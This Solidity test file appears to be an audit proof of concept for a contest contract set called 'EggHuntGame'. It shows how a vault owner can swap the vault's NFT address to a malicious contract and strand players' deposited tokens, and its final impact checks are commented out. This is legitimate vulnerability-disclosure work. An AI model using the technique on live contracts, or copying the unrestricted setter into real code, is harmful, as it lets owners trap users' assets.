// SPDX-License-Identifier: MIY

pragma solidity ^0.8.23;

import "../lib/forge-std/src/Test.sol";
import "../src/EggHuntGame.sol";
import "../src/EggstravaganzaNFT.sol";
import "../src/EggVault.sol";

contract AccessControlVulnerabilityTest is Test {
    EggHuntGame s_eggGame;
    EggstravaganzaNFT s_eggNFT;
    EggstravaganzaNFT s_eggMaliciousNFT;
    EggVault s_eggVault;
    address s_owner = address(1);
    address s_player = address(2);
    address s_vaultOwner = address(3);

    function setUp() public {
        // deploy legitimate contracts
        vm.startPrank(s_owner);
        s_eggNFT = new EggstravaganzaNFT("EggstravaganzaNFT", "EGG");
        vm.stopPrank();

        // Deploy vault with a separate owner
        vm.prank(s_vaultOwner);
        s_eggVault = new EggVault();

        // Deploy game contract
        vm.prank(s_owner);
        s_eggGame = new EggHuntGame(address(s_eggNFT), address(s_eggVault));

        // Setup connections
        vm.prank(s_owner);
        s_eggNFT.setGameContract(address(s_eggGame));

        // The vault owner sets the NFT contract
        vm.prank(s_vaultOwner);
        s_eggVault.setEggNFT(address(s_eggNFT));

        // start the game
        vm.prank(s_owner);
        s_eggGame.startGame(3600); //1 hour duration

        // Set 100% chance to find an egg
        vm.prank(s_owner);
        s_eggGame.setEggFindThreshold(100); // 100% chance to find egg for testing

        // player finds and desposits an egg
        vm.startPrank(s_player);
        s_eggGame.searchForEgg();
        s_eggNFT.approve(address(s_eggGame), 1);
        s_eggGame.depositEggToVault(1);
        vm.stopPrank();

        // deploy a mailicious NFT contract
        vm.startPrank(s_vaultOwner);
        s_eggMaliciousNFT = new EggstravaganzaNFT("Malicious", "MAL");

        // Set the vault owner as game contract for the malicious NFT
        s_eggMaliciousNFT.setGameContract(s_vaultOwner);

        // Pre-mint token ID 1 in the malicious contract to the vault owner
        // This simulates a fake token that will be "transferred" during withdrawal
        vm.stopPrank();
    }

    function testNFTAddressChangeAttack() public {
        // Initial state
        assertEq(s_eggNFT.ownerOf(1), address(s_eggVault)); // Vault owns the EggHuntGame
        assertTrue(s_eggVault.isEggDeposited(1)); // Egg is registered in the vault
        assertEq(s_eggVault.eggDepositors(1), s_player); // Player is the registered despositor

        // The vault owner can change the NFT contract at any time
        vm.prank(s_vaultOwner);
        s_eggVault.setEggNFT(address(s_eggMaliciousNFT));

        // We need to handle the fact that token ID 1 doesn't exist in the malicious contract

        console.log("Vault Owner Atack Successful:");
        console.log("Original NFT contract:", address(s_eggNFT));
        console.log("Malicious NFT contract set in vault:", address(s_eggVault.eggNFT()));
        console.log("Original egg (token ID) is still held by the vault:", address(s_eggNFT.ownerOf(1)));
        console.log(
            "The original egg is now inaccessible to the player since the vault points to a different NFT contract"
        );

        // Demonstrate the actual impact - player can't withdraw their original egg
        //vm.expectRevert("ERC721: invalid token ID");
        //vm.prank(s_player);
        //s_eggVault.withdrawEgg(1);

        // Verify eggs are still trapped in the original NFT contract
        //assertEq(s_eggNFT.ownerOf(1), address(s_eggVault));
    }
}
